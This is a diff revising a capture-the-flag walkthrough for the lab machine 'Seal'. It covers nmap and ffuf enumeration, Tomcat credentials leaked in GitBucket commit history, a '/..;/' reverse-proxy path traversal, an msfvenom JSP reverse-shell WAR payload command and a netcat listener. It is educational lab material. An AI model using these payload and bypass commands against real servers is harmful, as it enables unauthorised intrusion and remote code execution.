@@ -5,11 +5,11 @@ After gaining access to the system, a cronjob performing routine backups by crea
 After getting the SSH keys, the user can run ansible-playbook as root without a password.
 
 ## Recon and Enumeration
-Shown below is a full port scan of the box. There is a web app on port 443 and port 8080.
+First, run an nmap scan on the box. There is a web app on port 443 running nginx, and there's another web app on port 8080.
 ```
-# Nmap 7.92 scan initiated Wed Oct 13 19:48:06 2021 as: nmap -A -p- --min-rate 4000 -oA seal 10.10.10.250
-Nmap scan report for 10.10.10.250
-Host is up (0.060s latency).
+# Nmap 7.92 scan initiated Sun Dec 12 13:34:32 2021 as: nmap -AT5 -p- -oA seal -v 10.10.10.250
+Nmap scan report for seal.htb (10.10.10.250)
+Host is up (0.12s latency).
 Not shown: 65532 closed tcp ports (reset)
 PORT     STATE SERVICE    VERSION
 22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
@@ -19,35 +19,43 @@ PORT     STATE SERVICE    VERSION
 |_  256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519)
 443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)
 |_http-title: Seal Market
+| http-methods: 
+|_  Supported Methods: OPTIONS GET HEAD POST
 | ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
+| Issuer: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
 | Not valid before: 2021-05-05T10:24:03
-|_Not valid after:  2022-05-05T10:24:03
+| Not valid after:  2022-05-05T10:24:03
+| MD5:   9c4f 991a bb97 192c df5a c513 057d 4d21
+|_SHA-1: 0de4 6873 0ab7 3f90 c317 0f7b 872f 155b 305e 54ef
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+| tls-alpn: 
+|_  http/1.1
 | tls-nextprotoneg: 
 |_  http/1.1
 |_ssl-date: TLS randomness does not represent time
-| tls-alpn: 
-|_  http/1.1
-|_http-server-header: nginx/1.18.0 (Ubuntu)
 8080/tcp open  http-proxy
 | fingerprint-strings: 
 |   FourOhFourRequest: 
 |     HTTP/1.1 401 Unauthorized
-|     Date: Thu, 14 Oct 2021 03:02:51 GMT
-|     Set-Cookie: JSESSIONID=node0yey7quzlo8omguuvat167tso77.node0; Path=/; HttpOnly
+|     Date: Sun, 12 Dec 2021 20:36:43 GMT
+|     Set-Cookie: JSESSIONID=node01jvp2kry6ybg81jjyqcy32k3zi161.node0; Path=/; HttpOnly
 |     Expires: Thu, 01 Jan 1970 00:00:00 GMT
 |     Content-Type: text/html;charset=utf-8
 |     Content-Length: 0
 |   GetRequest: 
 |     HTTP/1.1 401 Unauthorized
-|     Date: Thu, 14 Oct 2021 03:02:51 GMT
-|     Set-Cookie: JSESSIONID=node04jyvquxbvz7a21r65c89bpyu75.node0; Path=/; HttpOnly
+|     Date: Sun, 12 Dec 2021 20:36:42 GMT
+|     Set-Cookie: JSESSIONID=node0zglqmmb1mu8918b21nbtomfpx159.node0; Path=/; HttpOnly
 |     Expires: Thu, 01 Jan 1970 00:00:00 GMT
 |     Content-Type: text/html;charset=utf-8
 |     Content-Length: 0
 |   HTTPOptions: 
 |     HTTP/1.1 200 OK
-|     Date: Thu, 14 Oct 2021 03:02:51 GMT
-|     Set-Cookie: JSESSIONID=node01aysejzfc37htbrd58sdtsm7k76.node0; Path=/; HttpOnly
+|     Date: Sun, 12 Dec 2021 20:36:42 GMT
+|     Set-Cookie: JSESSIONID=node019qtc8436cb1x2t8hbx3028ey160.node0; Path=/; HttpOnly
 |     Expires: Thu, 01 Jan 1970 00:00:00 GMT
 |     Content-Type: text/html;charset=utf-8
 |     Allow: GET,HEAD,POST,OPTIONS
@@ -79,108 +87,130 @@ PORT     STATE SERVICE    VERSION
 | http-auth: 
 | HTTP/1.1 401 Unauthorized\x0D
 |_  Server returned status 401 but no WWW-Authenticate header.
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
 |_http-title: Site doesn't have a title (text/html;charset=utf-8).
 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port8080-TCP:V=7.92%I=7%D=10/13%Time=61679A7D%P=x86_64-pc-linux-gnu%r(G
-SF:etRequest,F4,"HTTP/1\.1\x20401\x20Unauthorized\r\nDate:\x20Thu,\x2014\x
-SF:20Oct\x202021\x2003:02:51\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node04jyv
-SF:quxbvz7a21r65c89bpyu75\.node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Th
-SF:u,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x20text/htm
-SF:l;charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,109,"HT
-SF:TP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2014\x20Oct\x202021\x2003:02:51\
-SF:x20GMT\r\nSet-Cookie:\x20JSESSIONID=node01aysejzfc37htbrd58sdtsm7k76\.n
-SF:ode0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x
-SF:2000:00:00\x20GMT\r\nContent-Type:\x20text/html;charset=utf-8\r\nAllow:
-SF:\x20GET,HEAD,POST,OPTIONS\r\nContent-Length:\x200\r\n\r\n")%r(RTSPReque
-SF:st,AD,"HTTP/1\.1\x20505\x20Unknown\x20Version\r\nContent-Type:\x20text/
-SF:html;charset=iso-8859-1\r\nContent-Length:\x2058\r\nConnection:\x20clos
-SF:e\r\n\r\n<h1>Bad\x20Message\x20505</h1><pre>reason:\x20Unknown\x20Versi
-SF:on</pre>")%r(FourOhFourRequest,F4,"HTTP/1\.1\x20401\x20Unauthorized\r\n
-SF:Date:\x20Thu,\x2014\x20Oct\x202021\x2003:02:51\x20GMT\r\nSet-Cookie:\x2
-SF:0JSESSIONID=node0yey7quzlo8omguuvat167tso77\.node0;\x20Path=/;\x20HttpO
-SF:nly\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nCont
-SF:ent-Type:\x20text/html;charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%
-SF:r(Socks5,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x5\r\nCo
-SF:ntent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\
-SF:nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:
-SF:\x20Illegal\x20character\x20CNTL=0x5</pre>")%r(Socks4,C3,"HTTP/1\.1\x20
-SF:400\x20Illegal\x20character\x20CNTL=0x4\r\nContent-Type:\x20text/html;c
-SF:harset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\
-SF:r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x
-SF:20CNTL=0x4</pre>")%r(RPCCheck,C7,"HTTP/1\.1\x20400\x20Illegal\x20charac
-SF:ter\x20OTEXT=0x80\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nC
-SF:ontent-Length:\x2071\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\
-SF:x20400</h1><pre>reason:\x20Illegal\x20character\x20OTEXT=0x80</pre>");
-No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
-TCP/IP fingerprint:
-OS:SCAN(V=7.92%E=4%D=10/13%OT=22%CT=1%CU=40851%PV=Y%DS=2%DC=T%G=Y%TM=61679A
-OS:96%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)OP
-OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
-OS:11NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
-OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
-OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
-OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
-OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
-OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
-OS:D=S)
-
+SF-Port8080-TCP:V=7.92%I=7%D=12/12%Time=61B65D59%P=x86_64-pc-linux-gnu%r(G
+SF:etRequest,F6,"HTTP/1\.1\x20401\x20Unauthorized\r\nDate:\x20Sun,\x2012\x
+SF:20Dec\x202021\x2020:36:42\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node0zglq
+SF:mmb1mu8918b21nbtomfpx159\.node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20
+SF:Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x20text/h
+SF:tml;charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,10A,"
+SF:HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sun,\x2012\x20Dec\x202021\x2020:36:4
+SF:2\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node019qtc8436cb1x2t8hbx3028ey160
+SF:\.node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu,\x2001\x20Jan\x20197
+SF:0\x2000:00:00\x20GMT\r\nContent-Type:\x20text/html;charset=utf-8\r\nAll
+SF:ow:\x20GET,HEAD,POST,OPTIONS\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRe
+SF:quest,AD,"HTTP/1\.1\x20505\x20Unknown\x20Version\r\nContent-Type:\x20te
+SF:xt/html;charset=iso-8859-1\r\nContent-Length:\x2058\r\nConnection:\x20c
+SF:lose\r\n\r\n<h1>Bad\x20Message\x20505</h1><pre>reason:\x20Unknown\x20Ve
+SF:rsion</pre>")%r(FourOhFourRequest,F7,"HTTP/1\.1\x20401\x20Unauthorized\
+SF:r\nDate:\x20Sun,\x2012\x20Dec\x202021\x2020:36:43\x20GMT\r\nSet-Cookie:
+SF:\x20JSESSIONID=node01jvp2kry6ybg81jjyqcy32k3zi161\.node0;\x20Path=/;\x2
+SF:0HttpOnly\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r
+SF:\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Length:\x200\r\n\
+SF:r\n")%r(Socks5,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x5
+SF:\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2
+SF:069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>r
+SF:eason:\x20Illegal\x20character\x20CNTL=0x5</pre>")%r(Socks4,C3,"HTTP/1\
+SF:.1\x20400\x20Illegal\x20character\x20CNTL=0x4\r\nContent-Type:\x20text/
+SF:html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20clos
+SF:e\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20chara
+SF:cter\x20CNTL=0x4</pre>")%r(RPCCheck,C7,"HTTP/1\.1\x20400\x20Illegal\x20
+SF:character\x20OTEXT=0x80\r\nContent-Type:\x20text/html;charset=iso-8859-
+SF:1\r\nContent-Length:\x2071\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Me
+SF:ssage\x20400</h1><pre>reason:\x20Illegal\x20character\x20OTEXT=0x80</pr
+SF:e>");
+Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Uptime guess: 39.070 days (since Wed Nov  3 11:56:03 2021)
 Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=261 (Good luck!)
+IP ID Sequence Generation: All zeros
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-TRACEROUTE (using port 80/tcp)
-HOP RTT      ADDRESS
-1   59.93 ms 10.10.14.1
-2   60.05 ms 10.10.10.250
+TRACEROUTE (using port 1720/tcp)
+HOP RTT       ADDRESS
+1   120.07 ms 10.10.14.1
+2   120.80 ms seal.htb (10.10.10.250)
 
+Read data files from: /usr/bin/../share/nmap
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Wed Oct 13 19:48:54 2021 -- 1 IP address (1 host up) scanned in 48.85 seconds
+# Nmap done at Sun Dec 12 13:37:04 2021 -- 1 IP address (1 host up) scanned in 152.59 seconds
 ```
 
-When viewing the commit history, there is a commit `http://10.10.10.250:8080/root/seal_market/commit/ac210325afd2f6ae17cce84a8aa42805ce5fd010` with a comment "Adding tomcat configuration". It contains credentials in `seal_market-master/tomcat/tomcat-users.xml`:
+##### Enumerating port 443
+Visiting https://seal.htb shows the web app on port 443. There are some input fields, but fuzzing these fields don't show any interesting results.
+![seal](screenshots/seal.png)
 
-`<user username="tomcat" password="42MrHBf*z8{Z%" roles="manager-gui,admin-gui"/>`
+Run ffuf `ffuf -w ~/Wordlists/directories.txt -u 'https://seal.htb/FUZZ' -c | tee seal.ffuf` to search for directories and other objects. There appears to be a `/admin` page.
+```
+images                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 124ms]
+admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 123ms]
+icon                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 122ms]
+css                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 126ms]
+js                      [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 122ms]
+backup                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 122ms]
+manager                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 123ms]
+```
 
-Here is useful information for Tomcat pentetration: https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat
+This admin page shows that the box is running Apache Tomcat/9.0.31, so Nginx is likely just running as a reverse proxy.
+![seal](screenshots/tomcat.png)
 
-Although `https://10.10.10.250/manager/html` cannot be accessed, `https://10.10.10.250/manager/status` can be accessed with the credentials `tomcat:42MrHBf*z8{Z%`. To access the manager/html page, path traversal must be used: `https://10.10.10.250/manager/status/..;/html`
+[Here is a useful page for pentesting tomcat](https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat). It mentions that a few interesting paths such as `/manager/html` and `/manager/status`.
+
+Attempting to access `/manager/html` returns *403 Forbidden*.
+![Forbidden](screenshots/forbidden.png)
+
+Accessing `/manager/status` presents a login, but default credentials don't work.
+![status fail1](screenshots/status_fail1.png)
+![status fail2](screenshots/status_fail2.png)
+
+##### Enumerating port 8080
+Port 8080 appears to be running a *GitBucket* app.
+![gitbucket](screenshots/gitbucket.png)
+
+Simply create an account and sign in.
+![register](screenshots/register.png)
+![signin](screenshots/signin.png)
+
+After signing in, the new user can view the news feed and existing git repositories. After taking a look, there appears to be three users: *root*, *luis*, and *alex* and three repositories: `root/seal_market` and `root/infra`.
+![newsfeed](screenshots/newsfeed.png)
+
+After some digging, the Tomcat credentials file is found in `root/seal_market/tomcat/tomcat-users.xml`
+![sealmarket tomcat](screenshots/sealmarket_tomcat.png)
+![tomcat users](screenshots/tomcat_users.png)
+
+All of these tomcat users are commented out, so there is nothing too interesting. However since this is a git repository, checking the history of the file might show interesting info.
+![history](screenshots/history.png)
+
+There are two commits that made changes to the `tomcat-users.xml` file. Viewing the most recent commit will show the changes. It shows that plaintext tomcat creds `tomcat:42MrHBf*z8{Z%`.
+![commits](screenshots/commits.png)
+![creds](screenshots/creds.png)
+
+Use these credentials to log into tomcat at https://seal.htb/manager/status
+![login](screenshots/login.png)
+
+However, standard path traversal with the `https://seal.htb/manager/status/../html` sequence does not allow a redirec to to `/manager/html`.
+
+According to [this article](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/), Tomcat (the backend) and Nginx (the reverse proxy) normalize paths differently, so using the `/..;/` sequence allows the attacker to access the `/manager/html` page via `https://seal.htb/manager/status/..;/html`.
+![path traversal](screenshots/path_traversal.png)
 
 ## Exploitation and user.txt
-A War file can be uploaded to gain a reverse shell. 
-1. Generate an msfvenom war payload with `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.165 LPORT=1337 -f war -o payload.war`
-2. Use BurpSuite to intercept and send a post request containing `payload.war`
+A War file can be uploaded to the `/manager/html` page to gain a reverse shell. Generate an msfvenom war payload with `msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=1337 -f war -o payload.war`
+![msfvenom](screenshots/msfvenom.png)
 
-```
-POST /manager/status/..;/html/upload?org.apache.catalina.filters.CSRF_NONCE=1A84327863C89FBD7646A9235DF59BC3 HTTP/1.1
-Host: 10.10.10.250
-Cookie: JSESSIONID=D4667DE236DC3662763DCB3ED1062585; JSESSIONID=node06cjtymn23dhaoa3zkm929f5u14.node0
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: https://10.10.10.250/manager/status/..;/html
-Content-Type: multipart/form-data; boundary=---------------------------5962015423903397352762163284
-Content-Length: 1330
-Origin: https://10.10.10.250
-Authorization: Basic dG9tY2F0OjQyTXJIQmYqejh7WiU=
-Upgrade-Insecure-Requests: 1
-Sec-Fetch-Dest: document
-Sec-Fetch-Mode: navigate
-Sec-Fetch-Site: same-origin
-Sec-Fetch-User: ?1
-Dnt: 1
-Sec-Gpc: 1
-Te: trailers
-Connection: close
+Uploading the war file returns *403 Forbidden*, because it makes a request underneath `/manager/html`.
+![browse](screenshots/browse.png)
 
------------------------------5962015423903397352762163284
-Content-Disposition: form-data; name="deployWar"; filename="payload.war"
-Content-Type: application/octet-stream
+To bypass this, intecept the war upload request to `/manager/status/..;/html` using BurpSuite's proxy.
+![intercept](screenshots/intercept.png)
 
-(trimmed payload)
-```
+Go back to `https://seal.htb/manager/status/..;/html` to verify the successful payload upload.
+![success](screenshots/success.png)
 
-3. Start a listener with `nc -lvnp 1337`
-4. Visit `https://10.10.10.250/payload/lyibvpiewin.jsp` in the web browser to abuse the code execution. This gives a reverse shell.
+Start a listener with `nc -lvnp 1337` and then visit https://seal.htb/payload/lyibvpiewin.jsp in the web browser to abuse code execution.
 
 Upgrade the shell with
 ```
